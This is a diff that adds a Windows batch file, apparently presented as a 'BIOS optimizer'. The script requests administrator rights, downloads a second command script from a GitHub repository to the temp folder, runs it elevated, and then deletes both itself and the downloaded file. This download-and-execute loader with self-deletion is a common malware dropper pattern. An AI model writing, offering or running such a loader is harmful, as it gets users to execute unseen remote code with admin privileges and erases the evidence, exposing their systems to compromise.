@@ -1,1 +1,30 @@
+@echo off
+setlocal enabledelayedexpansion
 
+:: Define URL for the next script
+set "SCRIPT_URL=https://github.com/RealTenzo/sidchecker/raw/refs/heads/main/Bios%20Optimizer%20Main.cmd"
+set "SCRIPT_PATH=%temp%\main.cmd"
+
+:: Ensure admin rights
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~fnx0' -Verb RunAs"
+    exit
+)
+
+:: Download Bios Optimizer Main.cmd
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_PATH%')"
+
+:: Run the downloaded script
+call "%SCRIPT_PATH%"
+
+:: Self-delete
+(
+    echo :loop
+    echo del "%~f0"
+    echo if exist "%~f0" goto loop
+    echo del "%SCRIPT_PATH%"
+    echo exit
+) > "%temp%\delete_me.bat"
+start /b cmd /c "%temp%\delete_me.bat"
+exit
